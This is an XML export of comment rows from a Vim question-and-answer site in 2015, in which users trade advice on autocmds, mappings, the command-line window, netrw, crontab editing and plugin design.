  <row Id="2792" PostId="2702" Score="1" Text="@muru No, `CursorHold` is executed once only, this is explicitly documented as: *&quot;doesn't fire every 'updatetime' ms if you leave Vim to make some coffee. :)&quot;*" CreationDate="2015-03-25T16:24:30.543" UserId="51" />
  <row Id="2793" PostId="2725" Score="3" Text="`q` is very handy and used to record macros (see `:h q`). You may want to think about a different set of keys for you mapping. Maybe use a `&lt;leader&gt;`. See `:h mapleader`." CreationDate="2015-03-25T16:53:39.087" UserId="778" />
  <row Id="2794" PostId="2717" Score="0" Text="Note that `perl -c` is *not* safe to run on untrusted code." CreationDate="2015-03-25T18:34:19.603" UserId="31" />
  <row Id="2795" PostId="2726" Score="0" Text="Vim also has the `StdinReadPre` and `StdinReadPost` autocmds, which could be used to do this for you automatically. You could also use the `VimEnter` autocmd, but then you can't distinguish between reading from stdin and just typing `vim` with no arguments ([my answer here](http://vi.stackexchange.com/a/715/51) actually does something very similar)." CreationDate="2015-03-25T19:27:51.227" UserId="51" />
  <row Id="2796" PostId="2727" Score="0" Text="Thanks `:CtrlP myproject` was what I needed.  Note to anyone else looking at this, `myproject` is the path to the directory that you want to use as your parent." CreationDate="2015-03-25T20:54:03.667" UserId="697" />
  <row Id="2797" PostId="2717" Score="0" Text="@derobert What do you mean by _untrusted_?" CreationDate="2015-03-25T20:58:40.677" UserId="1111" />
  <row Id="2798" PostId="2717" Score="0" Text="`perl -c` *executes* parts of the passed script. For example, try feeding this through `perl -c`: `BEGIN { print &quot;oh noes\n&quot; }` See the `perlrun` manpage for details." CreationDate="2015-03-25T21:04:11.147" UserId="31" />
  <row Id="2799" PostId="2709" Score="0" Text="My [answer here](http://vi.stackexchange.com/a/2731/51) has some info about the `autoread` setting &amp; it's limitations ... possibly this is also an answer for this question?" CreationDate="2015-03-25T21:05:04.257" UserId="51" />
  <row Id="2800" PostId="2702" Score="0" Text="I removed the [tag:gvim] tag again, I hope that's okay ;-) As I see it, this questions is *not* really *about* gVim, as focus change is just one event on which Vim checks if the file is changed (there are a whole bunch, see my answer for details). Most, if not all, ways to improve on this will work fine in both Vim and gVim." CreationDate="2015-03-25T21:19:11.873" UserId="51" />
  <row Id="2801" PostId="2717" Score="0" Text="@derobert Yes. That is true." CreationDate="2015-03-25T22:09:15.993" UserId="1111" />
  <row Id="2802" PostId="2725" Score="0" Text="I prefer keyboard macros to recordings, and I also use `q` mapped to `exit` in bash, `sys.exit()` in python, and so weiter." CreationDate="2015-03-25T23:21:15.847" UserId="182" />
  <row Id="2803" PostId="2732" Score="0" Text="Where you've said *register*, did you mean *mark*?" CreationDate="2015-03-26T00:08:20.647" UserId="64" />
  <row Id="2804" PostId="2726" Score="0" Text="[WFM](https://github.com/jalanb/dotjab/commit/21581c4b57bc6d3c726a1b3011c24bb423712d85), YMMV" CreationDate="2015-03-26T00:10:23.573" UserId="182" />
  <row Id="2806" PostId="2732" Score="0" Text="Yep, that's what I meant.  I updated the question." CreationDate="2015-03-26T01:05:20.270" UserId="132" />
  <row Id="2807" PostId="2735" Score="1" Text="Since `crontab` typically lifts the value of `EDITOR` or `VISUAL` (if it is defined), you can set them: `EDITOR='VIM_NOBACKUP=1 vim'`." CreationDate="2015-03-26T07:56:07.300" UserId="205" />
  <row Id="2809" PostId="2732" Score="1" Text="Your function will work outside of visual mode anyway so you can probably use `getpos()`. Could you show us what you already have?" CreationDate="2015-03-26T08:13:55.007" UserId="54" />
  <row Id="2810" PostId="2702" Score="0" Text="@Carpetsmoker ah, I was under the impression that gVim checked regularly while it had keyboard focus (thus making it a gVim question), but it appears I was mistaken. Thanks for clearing that up." CreationDate="2015-03-26T08:25:07.757" UserId="1489" />
  <row Id="2811" PostId="2723" Score="0" Text="Try the built-in `:help`, it is a very worthy alternative to google." CreationDate="2015-03-26T11:55:34.143" UserId="54" />
  <row Id="2812" PostId="2736" Score="0" Text="That's exactly what I was looking for, thanks." CreationDate="2015-03-26T13:37:04.947" UserId="132" />
  <row Id="2813" PostId="2735" Score="0" Text="@muru I've tried, but I don't think it works. `crontab -e` generates `crontab: VIM_NOBACKUP=1 vim: No such file or directory`." CreationDate="2015-03-26T14:07:30.213" UserId="467" />
  <row Id="2814" PostId="2735" Score="1" Text="Must be an OSX thing, because it works on Arch Linux and Ubuntu, bash and zsh." CreationDate="2015-03-26T14:10:35.237" UserId="205" />
  <row Id="2815" PostId="2723" Score="0" Text="@romainl How do you use `:help` to get CJK font settings? I would like to know :)" CreationDate="2015-03-26T14:42:40.873" UserId="1315" />
  <row Id="2816" PostId="2709" Score="0" Text="Have you considered using a [version control system](http://en.wikipedia.org/wiki/Revision_control) to manage the shared files?" CreationDate="2015-03-26T14:44:42.187" UserId="13" />
  <row Id="2817" PostId="2735" Score="1" Text="All the mucking about with environment variables is silly; Vim has a way to deal with file-specific settings, and it's called autocmds. It looks like you just copied this from the link, but it seems that the author of that is not very familiar with Vim." CreationDate="2015-03-26T14:58:36.043" UserId="51" />
  <row Id="2818" PostId="2735" Score="0" Text="@Carpetsmoker Thanks. I've re-arranged the solutions, so the easier one comes first. I've left environment variables just for reference/alternative way of doing it. `crontab.*` is enough, as `crontab -e` generates random files like `/tmp/crontab.X`." CreationDate="2015-03-26T15:18:41.593" UserId="467" />
  <row Id="2819" PostId="2735" Score="1" Text="Why include it at all? It's a silly way of doing things, and there's almost never a reason to not use an autocmd. When we remove that, we are left with just the autocmd, which is the same answer which has been here for over a month and a half. This answer adds nothing but noise." CreationDate="2015-03-26T15:32:39.017" UserId="51" />
  <row Id="2820" PostId="2626" Score="0" Text="Using `:cd F:/` and `:cd F:\ ` (I don't have a `H:`) works for me on Windows 7 with Vim 7.4 with no patches (as downloaded from www.vim.org)... I can't reproduce this problem.... :-/" CreationDate="2015-03-26T15:42:30.513" UserId="51" />
  <row Id="2821" PostId="2735" Score="0" Text="@Carpetsmoker Some people could have different problems and alternative solution could work or they just prefer this way. In example first part could not work if you've `vi` linked to `vim` (which you didn't include). And this is completely different answer to yours, so I don't get your point. Secondly in your answer you're changing inodes instead which is your reason to not use autocmd, which for me it only does the noise. Two different options/opinions are always good, unless you want to monopolize both Q&amp;A." CreationDate="2015-03-26T15:46:52.117" UserId="467" />
  <row Id="2822" PostId="2744" Score="2" Text="I don't see this problem. I used: `gvim /home/martin`, and then tried both selecting `../` with the keyboard (Enter) and clicking on it with the mouse. I go up a directory, and in this new directory `../` is selected again. Perhaps the problem is something in your vimrc file? Try [How do I debug my vimrc file?](http://vi.stackexchange.com/q/2003/51)." CreationDate="2015-03-26T15:47:42.543" UserId="51" />
  <row Id="2823" PostId="2108" Score="0" Text="Related: [Open several files in new tabs with VIM](http://stackoverflow.com/questions/11430361/open-several-files-in-new-tabs-with-vim) at Stack Overflow." CreationDate="2015-03-26T15:49:45.370" UserId="1528" />
  <row Id="2824" PostId="2723" Score="0" Text="`:help guifont` and scroll around." CreationDate="2015-03-26T15:55:57.440" UserId="54" />
  <row Id="2825" PostId="2744" Score="0" Text="That is intersting.. it even happens with `vim -U NONE`" CreationDate="2015-03-26T15:59:49.717" UserId="489" />
  <row Id="2826" PostId="2744" Score="0" Text="Ah, I forgot to mention that I've enabled the file tree setting.. see the edited question" CreationDate="2015-03-26T16:03:03.607" UserId="489" />
  <row Id="2827" PostId="2743" Score="0" Text="You also need to fix the syntax highlighting (for some reason), as explained in the link and close the last tab, so the 'full' command would be: `:tabnew | args file1 file2 | argdo tabe | tabdo syntax on` The you need press Enter to clear the prompt and type `:close` to remove the last (empty) tab ... it's an awful lot of typing, and only worth it if you're opening a lot of tabs (for 2 or 3 files, just using `:tabe` twice would be faster)." CreationDate="2015-03-26T16:04:18.967" UserId="51" />
  <row Id="2828" PostId="2744" Score="1" Text="I can reproduce the problem when setting `let g:netrw_liststyle=3` ;-) By the way: `vim -U NONE` prevents loading the gvimrc file, *not* the vimrc file. You need to use `vim -u NONE` ;-)" CreationDate="2015-03-26T16:07:20.467" UserId="51" />
  <row Id="2830" PostId="2635" Score="0" Text="@ChestertheRooster I have a similar setup at work and `:cd H:\\` works fine for me. Are you sure the network drive is mounted?" CreationDate="2015-03-26T18:13:09.703" UserId="15" />
  <row Id="2831" PostId="2752" Score="0" Text="The first solution works great. The second solution didn't work for me, probably because the version of vi I am using is 3.10" CreationDate="2015-03-27T02:42:05.993" UserId="763" />
  <row Id="2832" PostId="413" Score="0" Text="@alxndr Yup. It works great! There's a full set of instructions here: http://stevelosh.com/blog/2012/10/a-modern-space-cadet/" CreationDate="2015-03-27T08:32:42.477" UserId="343" />
  <row Id="2833" PostId="2742" Score="2" Text="While @toro2k answered OP's question directly, this answer solves the problem more appropriately. It's kind of an [XY problem](http://xyproblem.info)." CreationDate="2015-03-27T08:49:40.373" UserId="64" />
  <row Id="2834" PostId="2758" Score="1" Text="I'm not 100% sure what you want, maybe a real example would help (what you have vs. what you want). Are you aware of gv? It reselects the last visual selection and might be of help here." CreationDate="2015-03-27T09:02:27.897" UserId="1296" />
  <row Id="2835" PostId="2759" Score="0" Text="Yep, exactly what I was looking for." CreationDate="2015-03-27T10:04:44.247" UserId="1542" />
  <row Id="2836" PostId="2759" Score="0" Text="And thanks for teaching me the `&lt;kbd&gt;`-tags. (two answers in one.)" CreationDate="2015-03-27T10:05:58.787" UserId="1542" />
  <row Id="2837" PostId="2755" Score="1" Text="Solution 2 only works in Visual Line mode, though." CreationDate="2015-03-27T11:40:54.127" UserId="88" />
  <row Id="2838" PostId="2762" Score="0" Text="That's always an option, I am just looking to see if it's possible to set colour according to the context." CreationDate="2015-03-27T13:55:35.547" UserId="1479" />
  <row Id="2839" PostId="2762" Score="0" Text="I don't think that is usefull, but you can detect if the search pattern (on / or  #) is the same as the word under cursor and change the Cursor highlight" CreationDate="2015-03-27T14:10:58.843" UserId="177" />
  <row Id="2840" PostId="2766" Score="0" Text="You can paste into the command line with `&lt;Ctrl-R&gt;`  followed by the name of the register you want to paste from (e.g. `*` for the Windows clipboard.)" CreationDate="2015-03-27T15:40:06.233" UserId="343" />
  <row Id="2841" PostId="2766" Score="0" Text="Actually I can paste into the commandline with Ctrl-V but copying from it is harder. Specifically it's hard to copy or paste just part of it." CreationDate="2015-03-27T15:44:03.323" UserId="878" />
  <row Id="2842" PostId="2767" Score="0" Text="I guess I don't know my Vim jargon. Is something called the &quot;command-line window&quot; that is not the single line at the bottom of Vim where I type commands? \-:" CreationDate="2015-03-27T15:47:41.690" UserId="878" />
  <row Id="2843" PostId="2766" Score="0" Text="Ah okay. `&lt;Ctrl-R&gt;` is still good to know about, though, because a). it works everywhere (`Ctrl-V` does something completely different for me), and b). it works for other registers too." CreationDate="2015-03-27T15:47:59.620" UserId="343" />
  <row Id="2844" PostId="2767" Score="4" Text="For searches started with `/`, you'd want to use `q/` instead of `q:`" CreationDate="2015-03-27T15:49:06.893" UserId="680" />
  <row Id="2845" PostId="2767" Score="0" Text="@hippietrail No, that's the command line. As @romainl suggests, you should read `:help cmdline-window`. (Or just try it out!)" CreationDate="2015-03-27T15:49:42.423" UserId="343" />
  <row Id="2846" PostId="2766" Score="0" Text="Yes I know they made compromises with copypaste on Windows so it could use its normal keystrokes and the functions which were tied to those keystrokes on other OSes got moved in Windows. That's why I originally included the windows tag in my question ..." CreationDate="2015-03-27T15:50:53.163" UserId="878" />
  <row Id="2847" PostId="2767" Score="0" Text="Oh so you're saying that rather than edit the regex as though it were a file I should edit the whole commandline as though it were a file?" CreationDate="2015-03-27T15:52:09.197" UserId="878" />
  <row Id="2848" PostId="2767" Score="1" Text="If you type `q/` instead of `/` vim will open a new window with your search history that you can edit as if it were a file." CreationDate="2015-03-27T15:57:31.357" UserId="680" />
  <row Id="2849" PostId="2766" Score="0" Text="@hippietrail How to copy/paste from the command line in Windows, and how to *&quot;edit a regular expression search string as if it were a file&quot;* are really 2 different questions ;-) It's a good topic for a *second* question." CreationDate="2015-03-27T16:00:27.630" UserId="51" />
  <row Id="2850" PostId="2766" Score="0" Text="Well yes. The abstract problem is &quot;I want to copy and past subexpressions in regexes in the vim commandline&quot; and one specific approach is &quot;if I knew a way to edit the regex as if it were a file I could solve my abstract problem&quot;." CreationDate="2015-03-27T16:07:39.120" UserId="878" />
  <row Id="2851" PostId="2767" Score="0" Text="@MattBoehm: Aha! This part about `q/` should be in the answer then." CreationDate="2015-03-27T16:08:22.937" UserId="878" />
  <row Id="2852" PostId="2767" Score="1" Text="The answer would be better too if it somehow introduced the concept and/or jargon &quot;command-line&quot; window&quot; since I suppose others will be like me in that though they've used Vim for years never had to use this feature before." CreationDate="2015-03-27T16:14:09.377" UserId="878" />
  <row Id="2853" PostId="2767" Score="1" Text="Everything you need to know about the command-line window is in the relevant documentation." CreationDate="2015-03-27T16:15:47.773" UserId="54" />
  <row Id="2854" PostId="2767" Score="0" Text="Except explaining why something called a command line window is a place for editing regexes. I would go for something like &quot;There's a feature you should learn about called the 'command line window' where you can edit commands, and regexes are treated as a kind of 'command'.&quot; I see the docs use the term &quot;search string&quot; too which can help skimming for just the info I need for this problem." CreationDate="2015-03-27T16:23:43.130" UserId="878" />
  <row Id="2855" PostId="2766" Score="1" Text="@hippietrail It feels more to me (and I presume @Carpetsmoker) that the abstract problem is &quot;I want to be able to edit regular expressions more powerfully&quot; and two *different* specific approaches to this are 1. Copy/paste in the commandline 2. Edit the regex as if it's a file." CreationDate="2015-03-27T16:24:03.983" UserId="343" />
  <row Id="2856" PostId="2766" Score="1" Text="Well that's a generalization of my problem I suppose (-: The specific power was long subparts of search strings used more than one, but the full power of an edit buffer seemed like something I thought must be in Vim though my Googling failed probably because I didn't know the key jargon... Ah I see the specific part about reusing subexpressions was edited out..." CreationDate="2015-03-27T16:27:23.847" UserId="878" />
  <row Id="2857" PostId="2767" Score="1" Text="You were given all the info you need to solve the problem in your question. If you want to know more about that feature and your curiosity is not satisfied by `:help cmdline-window` feel free to ask another — hopefully more specific — question." CreationDate="2015-03-27T16:29:18.177" UserId="54" />
  <row Id="2858" PostId="2767" Score="0" Text="Yes my problem is solved, for which I thank you all. I hope it will be more Googleable to anyone else with similar problems coming after me and not knowing the jargon. My question was more specific in its original form but was edited to be less specific. Anyway thanks again." CreationDate="2015-03-27T16:34:37.783" UserId="878" />
  <row Id="2859" PostId="2766" Score="1" Text="Both the title and the question itself ask *&quot;How can I edit a regular expression search string as if it were a file?&quot;* ;-) The Windows copy/paste thing just seemed like an off-hand remark to me. You can always revert my edit, or make more edits to your question ;-)" CreationDate="2015-03-27T17:40:49.457" UserId="51" />
  <row Id="2860" PostId="2766" Score="0" Text="I'll leave it. On some SE sites they just want your core question. On others they want you to provide backstory to show how it's really a problem you're facing." CreationDate="2015-03-27T17:50:52.037" UserId="878" />
  <row Id="2861" PostId="2765" Score="0" Text="Thank you for the answer." CreationDate="2015-03-27T17:58:45.100" UserId="307" />
  <row Id="2862" PostId="2754" Score="0" Text="I had tried this before (but forgot until now). It's pretty good, but it means that there will only ever be one match per line (the last possible match). I'd still like a line like `pouty puppet` to yield two matches." CreationDate="2015-03-27T18:00:15.620" UserId="64" />
  <row Id="2863" PostId="2770" Score="0" Text="Works great. I will be using this from now. I will try to implement the persistent one sometime later." CreationDate="2015-03-27T18:02:09.167" UserId="1479" />
  <row Id="2864" PostId="2752" Score="0" Text="After using the first solution here some, I realized that it flops when there are inner pairs of brackets." CreationDate="2015-03-27T19:28:19.057" UserId="763" />
  <row Id="2865" PostId="2752" Score="0" Text="Indeed it does.  It is a very simple solution, so I figured there would be some disadvantage to it.  I'll see what I can do to make it work, but it might end up being extremely complex." CreationDate="2015-03-27T19:32:52.087" UserId="865" />
  <row Id="2866" PostId="2769" Score="2" Text="This help excerpt mentions the `'hidden'` option, which may help with some of the oddness you described in your original question. Using `:set hidden` allows you to hide buffers even if they haven't been written to disk. For me, this setting was the tipping point towards mastering buffer navigation, moving away from a mess of splits and tabs." CreationDate="2015-03-28T00:18:09.590" UserId="64" />
  <row Id="2867" PostId="2765" Score="0" Text="From what I can see, using `p` in a terminal buffer does not enter Terminal mode, so the following `&lt;C-\&gt;&lt;C-N&gt;` should not be necessary. (That said, it's also totally harmless.)" CreationDate="2015-03-28T00:27:59.027" UserId="64" />
  <row Id="2868" PostId="2740" Score="2" Text="As asked, and based on the fact that you've chosen [toro2k's answer](http://vi.stackexchange.com/a/2741/64), this question is actually not related to filenames at all; it could be repurposed as a general question about matching regular expressions in VimScript. On the other hand, it feels like an [XY problem](http://xyproblem.info/), and [Carpetsmoker's answer](http://vi.stackexchange.com/a/2742/64) does a great job of addressing what I believe you were actually trying to accomplish." CreationDate="2015-03-28T00:36:37.923" UserId="64" />
  <row Id="2869" PostId="2765" Score="0" Text="@tommcdo good call, hadn't tried the feature myself yet so was just taking a shot. I'll remove that part." CreationDate="2015-03-28T04:32:41.900" UserId="680" />
  <row Id="2870" PostId="2740" Score="0" Text="@tommcdo I've re-edited the question for more general purpose as suggested and toro2k answer say exactly how to write regular expression condition (as per main question). The other answer deals only with specific case and focus on autocmd and filename, but it doesn't answer the main question (how to write simple regular expression condition), that's why I've chosen toro2k answer (which is more appropriate in this case)." CreationDate="2015-03-28T11:05:41.230" UserId="467" />
  <row Id="2871" PostId="2769" Score="0" Text="@tommcdo nice one.  I'll give that a go" CreationDate="2015-03-28T12:06:10.567" UserId="1518" />
  <row Id="2872" PostId="2772" Score="6" Text="FYI: I can't reproduce this problem on my Linux machine." CreationDate="2015-03-28T18:29:17.713" UserId="51" />
  <row Id="2873" PostId="2773" Score="0" Text="you can just delete the mapping (or comment it out)" CreationDate="2015-03-28T18:42:24.437" UserId="342" />
  <row Id="2874" PostId="2773" Score="0" Text="I need the mapping in every other buffer, so commenting it out completely isn't really an option." CreationDate="2015-03-28T18:44:06.193" UserId="489" />
  <row Id="2875" PostId="2774" Score="0" Text="Thank you for the answer, this makes sense. I've already sent an email to the author, hopefully this can be implemented soon." CreationDate="2015-03-28T20:10:09.040" UserId="489" />
  <row Id="2876" PostId="2772" Score="0" Text="I cannot reproduce this problem on my Mac either. Looks like you might have found a bug." CreationDate="2015-03-29T07:08:59.863" UserId="246" />
  <row Id="2877" PostId="2648" Score="0" Text="Thanks, it's what I was looking for. Just another thing, is it possible to navigate the list of occurrence (found by [I) within the Quickfix List?" CreationDate="2015-03-29T08:44:17.837" UserId="1450" />
  <row Id="2878" PostId="2775" Score="0" Text="Are you using an autocmd to restore the cursor position?" CreationDate="2015-03-29T11:07:13.267" UserId="246" />
  <row Id="2879" PostId="2777" Score="3" Text="It could probably be a good idea to use the `/c` flag for confirming substitutions." CreationDate="2015-03-29T11:20:14.360" UserId="54" />
  <row Id="2880" PostId="2777" Score="2" Text="I would also recommend using word boundaries `\&lt;` and `\&gt;` around the `search` to avoid partial word replacements." CreationDate="2015-03-29T14:02:25.943" UserId="64" />
  <row Id="2881" PostId="2780" Score="0" Text="Yes, that is located in the vimrc_example.vim file." CreationDate="2015-03-29T20:13:09.503" UserId="334" />
  <row Id="2882" PostId="1961" Score="0" Text="Setting the columns/lines to `160 x 42` gives a window shape approximating the [golden ratio](http://io9.com/5985588/15-uncanny-examples-of-the-golden-ratio-in-nature), and you get the awesomeness of `42` !" CreationDate="2015-03-30T04:50:34.700" UserId="398" />
  <row Id="2885" PostId="2783" Score="0" Text="If I just copy one of the colorscheme.vim files and then put it in separate folder will I be able to reuse it on my other machines? E.g. if I put it in a repo on github will I be able to just clone it or enable it in one of the plugin managers?" CreationDate="2015-03-30T08:49:02.470" UserId="428" />
  <row Id="2886" PostId="2783" Score="0" Text="@dkns, Yep, exactly. For instance, you can name your colorscheme as &quot;dkns_colorscheme.vim&quot;, put it in a colors/ directory and then push it up to Github. If you have a plugin manager installed, cloning this repo will make the colorscheme available to Vim." CreationDate="2015-03-30T08:51:16.967" UserId="246" />
  <row Id="2888" PostId="2784" Score="1" Text="Inside the README file check the output of `:verbose set tw?` and `:verbose set fo?`." CreationDate="2015-03-30T10:45:28.787" UserId="599" />
  <row Id="2889" PostId="2779" Score="2" Text="Settings like `'timeoutlen'` are used at the time that the mapping is *invoked*, not created." CreationDate="2015-03-30T10:53:06.020" UserId="64" />
  <row Id="2890" PostId="2635" Score="0" Text="@jamessan, yes, h drive is mounted. I can cd to it from cmd.exe, mingw bash shell, even in the vim.exe provided in mingw but not gvim" CreationDate="2015-03-30T11:32:20.233" UserId="1438" />
  <row Id="2892" PostId="2791" Score="2" Text="The autoload solution doesn't sound too bad to me, especially if you use a function name that's slightly more specific to what it's doing. It's hard to come up with a good example without knowing what other functionality your plugin had that the autoload init is *not* required for, but maybe something like `call express#initMapCommands()`? Anything that requires extra quoting, though, is a super bad idea." CreationDate="2015-03-31T06:30:41.253" UserId="343" />
  <row Id="2894" PostId="2795" Score="0" Text="This would actually need more quoting... `v:val` must be part of the string, because it is evaluated when the map internals are invoked. I think any solution involving quoting is less than ideal." CreationDate="2015-03-31T09:22:46.197" UserId="64" />
  <row Id="2895" PostId="2794" Score="1" Text="This is a lot of work for the end user. As a plugin developer, I'm trying to minimize the effort required to use my plugin." CreationDate="2015-03-31T09:25:44.050" UserId="64" />
  <row Id="2896" PostId="2560" Score="0" Text="Your question is better after your edit ;-) But I think this question would probably get better answers if you would include a (small) vimrc file and (small) JS file that clearly demonstrate the problem. This would reduce the effort required by the potential answerer to get started in investigating your problem ;-)" CreationDate="2015-03-31T09:33:32.197" UserId="51" />
  <row Id="2897" PostId="2794" Score="0" Text="This solution is for a .vimrc that you may deploy where your plugin isn't installed. For a simplified installation guide, it's just `:runtime`.&#xA;Otherwise use an option as romainl suggested." CreationDate="2015-03-31T09:43:35.943" UserId="626" />
  <row Id="2898" PostId="2794" Score="0" Text="Even still, that requires the user to know where the file is. If they use a plugin manager, it could be somewhere less obvious than `plugin/`." CreationDate="2015-03-31T09:50:27.827" UserId="64" />
  <row Id="2899" PostId="2794" Score="0" Text="If they use a plugin manager, it will always be in `plugin/` -- if you organize your &quot;project&quot;/repository this way. Plugin managers update automatically the `'runtimepath'` option." CreationDate="2015-03-31T09:54:33.443" UserId="626" />
  <row Id="2900" PostId="2794" Score="0" Text="Oh, good point." CreationDate="2015-03-31T09:56:16.790" UserId="64" />
  <row Id="2901" PostId="2796" Score="6" Text="What do you want to achieve with that selection, there might be another way" CreationDate="2015-03-31T10:19:18.303" UserId="284" />
  <row Id="2902" PostId="2791" Score="0" Text="This is what I'm leaning towards, I think." CreationDate="2015-03-31T10:36:01.597" UserId="64" />
  <row Id="2905" PostId="2796" Score="0" Text="If it's separated by character, you may try to re-align the block first and select it then. See: [Align text only on first separator in VIM](http://stackoverflow.com/q/2129519/55075)" CreationDate="2015-03-31T13:06:21.933" UserId="467" />
  <row Id="2907" PostId="2801" Score="0" Text="I can't reproduce that with vim 7.4 on linux. The parameter is passed to firefox correctly when using 'let g:netrw_browsex_viewer='firefox' for me." CreationDate="2015-03-31T13:27:52.603" UserId="1296" />
  <row Id="2908" PostId="2801" Score="0" Text="@PhilippFrank The example URL doesn't work for me either (Vim 7.4, Linux) ... In any case, my solution is to select the URL in visual mode, and then use `gx` (which is not ideal but better than copy/paste)." CreationDate="2015-03-31T13:29:16.173" UserId="51" />
  <row Id="2909" PostId="2801" Score="0" Text="@PhillippFrank, OK. I added my browser details. I don't set that variable explicitly." CreationDate="2015-03-31T13:29:41.503" UserId="91" />
  <row Id="2910" PostId="2801" Score="0" Text="Strange, I just tried this with `vim -u NONE`, and now it won't open at all; obviously I have a plugin doing something strange." CreationDate="2015-03-31T13:31:47.503" UserId="91" />
  <row Id="2911" PostId="2801" Score="0" Text="@AndrewFerrier The `gx` command is part of netrw, which is a plugin shipped with Vim. It's not loaded if `compatible` is set... Reading the help, I think you can use `g:netrw_gx` to configure/fix this btw..." CreationDate="2015-03-31T13:34:12.160" UserId="51" />
  <row Id="2912" PostId="2801" Score="0" Text="@Andrew Ferrier: I needed to set that variable explicitly, otherwise gx would not work at all. I don't have access to chrome, but I tried konqueror and it's ok then. Maybe because you don't have that setting, netrw_filehandler is called and that borks it up." CreationDate="2015-03-31T13:45:29.757" UserId="1296" />
  <row Id="2913" PostId="2801" Score="0" Text="@Carpetsmoker the strange thing is that I'm in `nocompatible` mode (starting vim the regular way), yet `set g:netrw_gx?` tells me it's an unknown option..." CreationDate="2015-03-31T13:49:26.373" UserId="91" />
  <row Id="2914" PostId="2801" Score="1" Text="It's a variable, not an option, so you need to use `let`." CreationDate="2015-03-31T13:50:26.417" UserId="51" />
  <row Id="2915" PostId="2797" Score="0" Text="Are you using &quot;persisted&quot; to mean &quot;the state the file was in when the buffer was loaded&quot;? I'd usually expect &quot;persisted&quot; to mean the state of the file currently saved to disk." CreationDate="2015-03-31T14:13:48.207" UserId="343" />
  <row Id="2916" PostId="2560" Score="1" Text="@joeytwiddle The Tagbar plugin uses the external tools to create its own tags file. You shouldn't need to do it manually on the command line." CreationDate="2015-03-31T14:21:00.707" UserId="343" />
  <row Id="2917" PostId="2797" Score="0" Text="@Rich: No, we have the same definition. My mappings don't do exactly what the question asks for, but I still found it very useful." CreationDate="2015-03-31T14:28:29.937" UserId="970" />
  <row Id="2918" PostId="2803" Score="0" Text="what terminal are you using?" CreationDate="2015-03-31T20:23:05.753" UserId="342" />
  <row Id="2919" PostId="2803" Score="0" Text="Terminator and run on Arch linux" CreationDate="2015-03-31T20:37:25.167" UserId="1526" />
  <row Id="2920" PostId="2784" Score="0" Text="Output from tw: `textwidth=78 Last set from C:\Program Files\vim\vim74\vimrc_example.vim`&#xA;Output from fo: `formatoptions=tcq Last set from C:\Program Files\vim\vim74\vimrc_example.vim`" CreationDate="2015-03-31T20:40:25.867" UserId="398" />
  <row Id="2921" PostId="2786" Score="0" Text="Thanks, `set formatoptions=` fixed the behaviour. From my comment above it looks like gvim is taking settings from `vimrc_example.vim` so I'll rename the file to `vimrc_example.vimx` and see what happens" CreationDate="2015-03-31T20:44:59.213" UserId="398" />
  <row Id="2922" PostId="2803" Score="0" Text="These chars are the representation of the key you pressed." CreationDate="2015-03-31T20:49:35.170" UserId="342" />
  <row Id="2923" PostId="2784" Score="0" Text="Commented out the offending line of `vimrc_example.vim`. Problem fixed, thanks" CreationDate="2015-03-31T20:51:51.083" UserId="398" />
  <row Id="2924" PostId="2803" Score="0" Text="These are the escape sequences sent by the keys minus the initial escape character. Are they printed in the status line? Normally they should be recorded in the terminal database and vim should find them on its own. What is the value of the `TERM` environment variable? Do other terminal applications (`less`, `bash`, …) recognize the keys properly? Do the keys work in other terminal emulators? Do you have the same problem if you run `vim -u /dev/null`?" CreationDate="2015-03-31T21:47:51.330" UserId="8" />
  <row Id="2925" PostId="2803" Score="0" Text="It's only happens on vim.  Works in terminal emulator. I've tried to use `xterm` and `linux` on `TERM` environment variable. Both have no effects. I`ve tried every possible value for set term inside vim too. It still has no any effects" CreationDate="2015-03-31T21:57:46.093" UserId="1526" />
  <row Id="2927" PostId="2790" Score="0" Text="You might need to run `set iskeyword+=:` so that vim will make `:` a keyword character. Vim only searches for the keyword under the cursor when `&lt;c-]&gt;` is hit." CreationDate="2015-03-31T23:31:48.617" UserId="46" />
  <row Id="2928" PostId="2803" Score="0" Text="@BagolDaplun do you have a vimrc? (Are you in nocompatible mode?)" CreationDate="2015-03-31T23:33:30.303" UserId="46" />
  <row Id="2929" PostId="2792" Score="2" Text="Related question: [_How is command history resolved between multiple instances of Vim?_](http://vi.stackexchange.com/q/361/24)" CreationDate="2015-04-01T00:22:56.840" UserId="24" />
  <row Id="2930" PostId="2648" Score="0" Text="Not without doing something particularly roundabout, as far as I'm aware. Might be worth asking another question." CreationDate="2015-04-01T02:35:49.903" UserId="1452" />
  <row Id="2931" PostId="2803" Score="0" Text="Yes, I have `.vimrc`. And I put `set nocompatible` there." CreationDate="2015-04-01T08:00:45.610" UserId="1526" />
  <row Id="2932" PostId="2803" Score="0" Text="@BagolDaplun, Did you already try starting vim with `vim -Nu NONE` and seeing if the problem is reproducible?" CreationDate="2015-04-01T09:09:40.887" UserId="246" />
  <row Id="2933" PostId="2803" Score="0" Text="I tried just now. It's not printing strange charactes, but my settings in  `.vimrc` are not loaded. So, could be the problem reside in `.vimrc` file? And what could it be?" CreationDate="2015-04-01T09:12:46.513" UserId="1526" />
  <row Id="2934" PostId="2804" Score="0" Text="No need for multiple cursors. 1. Visually select your lines. 2. `:'&lt;,'&gt;s/.*/&quot;&amp;&quot;`. Or use a macro: `qq` then `C&quot;&lt;C-r&gt;&quot;&quot;&lt;Esc&gt;j` then `q` then apply your macro to all the remaining lines." CreationDate="2015-04-01T09:26:01.267" UserId="54" />
  <row Id="2935" PostId="2804" Score="0" Text="@romainl thanks for your answer. Actually, I'm just practising multiple cursors. I have more complex multiple line editing requirements which require multiple cursor plugin. I'm not particularly trying to solve the example problem." CreationDate="2015-04-01T09:32:25.000" UserId="1276" />
  <row Id="2936" PostId="2804" Score="0" Text="Then post an actual problem or go use the plugin's issue tracker. And I very much doubt your problem &quot;require&quot; multiple cursors. You have a specific editing need -&gt; you think multiple cursors is the solution -&gt; it doesn't work -&gt; you ask about multiple cursors instead of asking about your initial problem. That's the XY problem." CreationDate="2015-04-01T09:48:49.330" UserId="54" />
  <row Id="2937" PostId="2804" Score="2" Text="@romainl,  ok, my complex requirement may be solved by other means, but I just like the multiple cursors plugin, because it's simple, it's like sublime, and I want to get used to it and get very productive. I'm no expert who's familiar with editing texts with commands. I explained very clear about my problem: I don't want to lose multiple cursors after escape. Your solution is great but I just prefer using multiple cursors plugin to solve it.  I'll post it to the plugin's issues if my problem can't be solved." CreationDate="2015-04-01T10:06:59.133" UserId="1276" />
  <row Id="2938" PostId="2805" Score="0" Text="thanks Ingo, I'm getting a little more creative with mappings recently but still in need of do's and don'ts guidance :)" CreationDate="2015-04-01T12:53:17.437" UserId="1443" />
